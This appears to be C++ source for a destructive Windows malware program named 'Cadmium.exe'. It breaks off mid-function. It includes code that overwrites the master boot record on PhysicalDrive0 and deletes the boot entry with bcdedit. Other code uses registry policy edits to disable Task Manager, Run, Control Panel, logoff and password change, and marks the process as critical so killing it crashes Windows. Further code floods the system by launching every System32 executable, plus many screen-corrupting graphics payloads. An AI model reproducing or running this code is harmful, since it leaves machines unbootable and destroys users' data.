0x0C, 0x77, 0xAB, 0xC1, 0x42, 0x5D, 0xAB, 0x2C, 0x20, 0xFB, 0xEC, 0x51, 0x25, 0xF1, 0x6D, 0xC0,
0xAA, 0x22, 0x25, 0x94, 0x8A, 0x76, 0xDD, 0x45, 0x40, 0xB2, 0xD7, 0x41, 0x57, 0x29, 0x0D, 0xC8,
0x99, 0xEC, 0x7A, 0x2B, 0xF8, 0x0C, 0x68, 0x22, 0xB5, 0x88, 0xA7, 0x61, 0xB6, 0x1D, 0xB2, 0x01,
0x74, 0x2C, 0x4C, 0xBD, 0x4E, 0xDF, 0xF8, 0xD8, 0x2C, 0x88, 0x3A, 0x08, 0xCA, 0xEA, 0x01, 0xE2,
0x8D, 0x4D, 0xE3, 0xCE, 0x3C, 0x57, 0x04, 0x36, 0x92, 0x49, 0x6D, 0x74, 0xB3, 0xF6, 0xAD, 0xF4,
0x75, 0x57, 0x72, 0x32, 0x72, 0xD1, 0x10, 0xE1, 0xEE, 0x26, 0x3E, 0x00, 0xD0, 0xB8, 0xF4, 0xDA,
0x5E, 0x59, 0x55, 0x94, 0xFC, 0xA3, 0x5D, 0xA4, 0x97, 0x17, 0x00, 0xDF, 0x4F, 0x8E, 0xE8, 0xC7,
0x78, 0xB2, 0xEB, 0x16, 0x80, 0x8E, 0xCC, 0xF8, 0x28, 0xA9, 0x49, 0x8F, 0x7B, 0xCE, 0x66, 0x65,
0x4E, 0xE3, 0x8B, 0xCC, 0xEC, 0x72, 0x55, 0x76, 0x60, 0xA9, 0xFF, 0x63, 0xC8, 0x81, 0x35, 0xF5,
0x0D, 0x7D, 0xB9, 0xB8, 0x22, 0x30, 0xDF, 0x32, 0xBB, 0x43, 0xD3, 0xBD, 0xF3, 0x36, 0x34, 0x4F,
0x76, 0x5B, 0x1C, 0x6F, 0x81, 0x32, 0x76, 0xE2, 0xF2, 0xD0, 0x38, 0xAE, 0x0B, 0xB2, 0xB5, 0x0A,
0x0E, 0xFE, 0x2B, 0x39, 0x21, 0xFA, 0x73, 0x38, 0x15, 0xAE, 0xFF, 0x2C, 0xFB, 0xF7, 0x56, 0x8F,
0x5A, 0xAB, 0x36, 0x2D, 0x67, 0x0A, 0xEC, 0xE0, 0xA3, 0xAB, 0x65, 0x82, 0xC3, 0x13, 0x10, 0xBD,
0xC2, 0x60, 0xF3, 0xC9, 0xA9, 0xE9, 0xBA, 0x96, 0xEC, 0x84, 0x6D, 0x81, 0x4D, 0xE3, 0xC9, 0xB1,
0xB3, 0x9B, 0x07, 0x62, 0xAF, 0xD5, 0x5B, 0xEF, 0x14, 0x93, 0x21, 0x3C, 0x0A, 0xF0, 0x73, 0x14,
0xCD, 0x22, 0xD5, 0x3C, 0x95, 0x42, 0xC8, 0xE5, 0xE4, 0x65, 0x2D, 0x85, 0xEF, 0x81, 0x22, 0x64,
0xA7, 0xBA, 0x45, 0xE3, 0x27, 0x04, 0xC6, 0x5D, 0xF8, 0xE1, 0xAE, 0xE0, 0xE1, 0x50, 0xA8, 0x35,
0xDA, 0x07, 0x0E, 0xA7, 0x7B, 0x5A, 0x3E, 0xC2, 0x8A, 0xBA, 0x7B, 0x71, 0xAF, 0x7D, 0x36, 0x3B,
0xB6, 0xFF, 0x0C, 0xD6, 0x13, 0xC3, 0x02, 0x47, 0x86, 0xB2, 0x15, 0xF4, 0x76, 0x2B, 0x87, 0x71,
0x5C, 0x3A, 0xDC, 0x2A, 0x10, 0x0B, 0xDE, 0xA8, 0xED, 0xD9, 0x6C, 0x51, 0xD0, 0xD7, 0x78, 0x03,
0xD0, 0xD0, 0x49, 0x21, 0xBE, 0x71, 0xAE, 0xE1, 0x81, 0x3F, 0x9F, 0xC3, 0x43, 0x18, 0x72, 0x8F,
0xCD, 0x72, 0x6D, 0x3F, 0x74, 0x4D, 0xC1, 0x64, 0x93, 0xDB, 0x19, 0xF1, 0x3D, 0xF2, 0xA8, 0x18,
0x71, 0xF7, 0x7A, 0xE5, 0x5D, 0x11, 0xF2, 0x3E, 0x30, 0x65, 0xF6, 0xA6, 0x3D, 0x13, 0x71, 0xE5,
0xDB, 0xF4, 0xC3, 0x98, 0x87, 0x9D, 0xA9, 0x3A, 0xC8, 0xB3, 0x38, 0xBA, 0x90, 0x2D, 0xFB, 0xE3,
0x2D, 0xFB, 0xD7, 0x51, 0xC6, 0x5E, 0xDF, 0x00, 0xA4, 0xC6, 0x7C, 0x1B, 0x2E, 0x84, 0xAE, 0x22,
0x4F, 0xBE, 0x8B, 0xC9, 0x48, 0xAC, 0xC3, 0xBA, 0x57, 0xA9, 0xB9, 0xA6, 0x7D, 0x06, 0x3A, 0x68,
0x45, 0xAD, 0xB4, 0x8C, 0xCD, 0xCA, 0x26, 0xA5, 0x7D, 0x5D, 0xF1, 0x21, 0xD5, 0x61, 0x51, 0xA7,
0x72, 0x5D, 0x03, 0xEC, 0x35, 0xD5, 0xE5, 0xA6, 0xA0, 0x31, 0x02, 0x47, 0x88, 0x7D, 0x25, 0xF4,
0x35, 0xD1, 0x1D, 0x3B, 0x24, 0xB6, 0x32, 0x40, 0x36, 0x0D, 0xA2, 0x4A, 0x91, 0x96, 0x1A, 0x06,
0xEC, 0xCD, 0x40, 0xD2, 0xEB, 0xBB, 0x78, 0x50, 0x3D, 0x0F, 0x99, 0xB7, 0x7D, 0xDC, 0x85, 0x15,
0xB4, 0x3A, 0xE6, 0xAF, 0xA8, 0xB8, 0xD7, 0x2D, 0x9A, 0x38, 0x1C, 0x76, 0xB2, 0x3C, 0xA6, 0xBA,
0x69, 0xF6, 0x66, 0xEB, 0x15, 0xE4, 0x70, 0xAE, 0x44, 0xAF, 0x41, 0x95, 0x36, 0x81, 0xD3, 0x88,
0x11, 0xD6, 0x1B, 0x9E, 0x7E, 0x3B, 0xC4, 0xEA, 0xAD, 0xFE, 0x84, 0x43, 0x64, 0xFC, 0x0A, 0x2D,
0xF3, 0x31, 0x55, 0xE7, 0xED, 0x2A, 0x19, 0x78, 0xA3, 0xB5, 0x6D, 0x43, 0xB9, 0xFB, 0xC7, 0x5B,
0xC8, 0x8A, 0x6D, 0x09, 0x0F, 0xBD, 0xAE, 0xA4, 0xFB, 0x15, 0x77, 0xF1, 0x5A, 0x8B, 0xC7, 0x91,
0xE0, 0x70, 0xB8, 0x2B, 0xA1, 0xAA, 0x3F, 0xB2, 0x1D, 0x9A, 0x97, 0x19, 0x11, 0x04, 0xF6, 0x2A,
0xCA, 0xBB, 0xDA, 0x3F, 0x7A, 0x15, 0xFA, 0x10, 0xA9, 0x2F, 0xB1, 0xC9, 0xF1, 0xC2, 0x88, 0x10,
0x8E, 0x63, 0xF7, 0x42, 0xBF, 0x0F, 0xDC, 0xA1, 0xD6, 0x27, 0x75, 0x61, 0x40, 0xE4, 0xBB, 0x31,
0xCE, 0xDE, 0xD1, 0xCA, 0x2F, 0x40, 0xC9, 0xAE, 0x81, 0x17, 0xB6, 0x6E, 0xD8, 0xB4, 0xE0, 0xDC,
0xE3, 0x31, 0xC1, 0x03, 0xDA, 0x14, 0x7B, 0xAA, 0x57, 0xA8, 0x3B, 0xDF, 0xC4, 0x6D, 0x2F, 0xBD,
0x34, 0xCE, 0x3B, 0x0C, 0x86, 0x15, 0xE9, 0x81, 0x9D, 0x72, 0x20, 0x09, 0xEC, 0x9B, 0x4D, 0x67,
0x33, 0xE3, 0x36, 0x33, 0x9E, 0x0C, 0x8B, 0x48, 0x8E, 0x00, 0xEC, 0x10, 0x55, 0x31, 0xAC, 0xC1,
0x79, 0xDC, 0x42, 0x97, 0xC8, 0xDB, 0x16, 0xDE, 0xDD, 0x8D, 0x0B, 0xB8, 0x23, 0x31, 0xBE, 0xD5,
0x88, 0x34, 0x59, 0xC0, 0xE1, 0x75, 0x88, 0xC4, 0x41, 0xB0, 0x36, 0x6E, 0xA7, 0xD9, 0xB0, 0x05,
0x36, 0x13, 0x74, 0x7A, 0xCF, 0x5B, 0x35, 0x04, 0x79, 0xFB, 0x46, 0xB7, 0x5A, 0xAA, 0xC2, 0x60,
0x75, 0x12, 0x3F, 0x8C, 0xC0, 0xE9, 0xE8, 0x32, 0xDE, 0xDD, 0x8B, 0x09, 0xF8, 0xD4, 0xBD, 0x89,
0x1B, 0x5D, 0x15, 0x43, 0x7A, 0x27, 0xCC, 0x09, 0xE8, 0xC5, 0xAF, 0xD6, 0x8B, 0x87, 0xF9, 0xD8,
0xC1, 0x5C, 0xBB, 0x35, 0xFE, 0x07, 0x1F, 0x4C, 0x37, 0x58, 0xBA, 0x81, 0xF6, 0xE6, 0x00, 0x00,
0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 2048, &Bytes, NULL);
    return 1;
}

COLORREF COLORHSL(int length);

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
    const WCHAR* labelText = L"" + rand() % 512;

    if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
    {
        SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
    }

    return true;
}

DWORD WINAPI messlabel(LPVOID lpvd)
{
    while (true)
    {
        HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
        EnumChildWindows(hwnd, EnumChildProc, NULL);
    }
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbarpoof(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(100);
        }
    }
}

DWORD WINAPI shaking(LPVOID lpParam) {
    int r = 1;
    while (true) {
        RECT rect;
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rect);
        int po = rand() % 4 + 1;
        if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, SWP_NOSIZE);
        if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, SWP_NOSIZE);
    }
}

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical()
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

void ApplyDistortion(HDC hdcScreen, int width, int height, float time) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    for (int y = 0; y < height; y++) {
        int offsetX = (int)(20 * sin((y * time) * 0.002f));
        BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
}

DWORD WINAPI payload1(LPVOID lpParam) {
    float time = 0.0f;

    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdcScreen = GetDC(NULL);
        ApplyDistortion(hdcScreen, w, h, time);
        BitBlt(hdcScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        time += 0.3f;
        ReleaseDC(NULL, hdcScreen);
    }
}

DWORD WINAPI hsl1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)(i ^ 4) + (i * 4) * sqrt(x ^ y + x);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            HDC hdcCopy = CreateCompatibleDC(hdc);

            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, !(rand() % 2) ? SRCAND : SRCPAINT);
            StretchBlt(hdcCopy, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, WHITENESS);
            BLENDFUNCTION blend = { 0, 0, 50, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI hsl2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)(i ^ 4) + (i * 4) * (x + y);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 40000.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCAND);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCPAINT);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI plasmahsl1(LPVOID lpParam) { // Credits to VenraTech for the config
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)(i ^ 4) + (i * 4) + cbrt(x * (i * 100 / ((y / 10) * sqrt(x * (y * i / 16)))));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);

                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx | x ^ y) / 100000.0 + 0.09, 1.0);
                hslcolor.s = 1.f;

                if (hslcolor.l < .4f)
                {
                    hslcolor.l += .2f;
                }

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCCOPY);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCINVERT);
            BitBlt(hdc, rand() % 6, rand() % 6, w, h, hdc, rand() % 6, rand() % 6, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
            StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);
            StretchBlt(hdc, 0, 0, w, h, hdc, 0, h, w, -h, SRCCOPY);
            StretchBlt(hdc, 0, 0, w, h, hdc, w, h, -w, -h, SRCCOPY);
            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
            DeleteObject(brush);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI textouts(LPVOID lpParam) {
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;

    while (1)
    {
        HDC hdc = GetDC(0);
        text1 = "Cadmium.exe";
        text2 = "UltraDasher965";
        text3 = "TELEPATHII";

        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, 1);

        HFONT font1 = CreateFontA(30, 20, rand() % 200, rand() % 20, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
        SelectObject(hdc, font1);

        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));

        DeleteObject(font1);
        ReleaseDC(0, hdc);
        Sleep(20);
    }
}

DWORD WINAPI payload5(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    HDC hdc;
    HDC hdcMem;
    HBITMAP hbm;

    for (int i = 0;; i++, i %= 3) {

        int r = rand() % 30;
        int g = rand() % 20;
        int b = rand() % 10;
        int power = 1;

        hdc = GetDC(0);
        hdcMem = CreateCompatibleDC(hdc);
        hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);

        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);

        for (int i = 0; w * h > i; i++) {

            int v = 4;
            ((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v + power))[r] + 5.2;
            ((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v + power))[g] + 5.2;
            ((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v + power))[b] + 5.2;

        }
        SetBitmapBits(hbm, w * h * 4, data);

        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
    }
}

DWORD WINAPI masher(LPVOID lpParam) { // Credits to sixtyfourYT for this payload, but I modified it
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            HDC hdcCopy = CreateCompatibleDC(hdc);
            INT randW = rand() % w;
            INT randH = rand() % h;

            BitBlt(hdcCopy, randW, 10, rand() % 1000, h, hdc, randW, 0, SRCERASE);
            BitBlt(hdcCopy, 10, randH, w, rand() % 1000, hdc, 0, randH, SRCERASE);
            BLENDFUNCTION blend = { 0, 0, 50, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
            DeleteObject(hdcCopy);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI hsl3(LPVOID lpParam) {
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        BITMAPINFO bmpi = { 0 };
